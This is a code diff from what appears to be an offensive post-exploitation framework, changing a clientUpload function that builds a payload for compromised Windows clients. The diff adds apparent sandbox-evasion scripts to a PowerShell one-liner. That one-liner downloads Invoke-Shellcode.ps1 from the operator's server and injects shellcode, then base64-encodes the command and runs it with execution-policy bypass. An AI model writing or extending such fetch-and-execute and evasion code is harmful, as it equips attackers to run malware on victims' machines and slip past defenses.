@@ -149,13 +149,16 @@ def checkUpload():
 
 def clientUpload(fileToUpload, powershellExec, isExe, json):
     from menu import returnIP
+    from encrypt import getSandboxScripts
     clientnumber = checkUpload()
     if clientnumber:
         if isExe:
             newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
             moduleport = FUNCTIONS().randomUnusedPort()
             FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
-            encPowershell = "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Code -Force -Shellcode @(%s)"%(returnIP(), moduleport, newpayloadlayout.rstrip(','))
+            encPowershell = getSandboxScripts('powershell')
+            encPowershell += "IEX(New-Object Net.WebClient).DownloadString('http://%s:%s/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Code -Force -Shellcode @(%s)"%(returnIP(), moduleport, newpayloadlayout.rstrip(','))
+            print encPowershell
             encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
             fullExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
             b64Exec = base64.b64encode(fullExec.encode('UTF-16LE'))
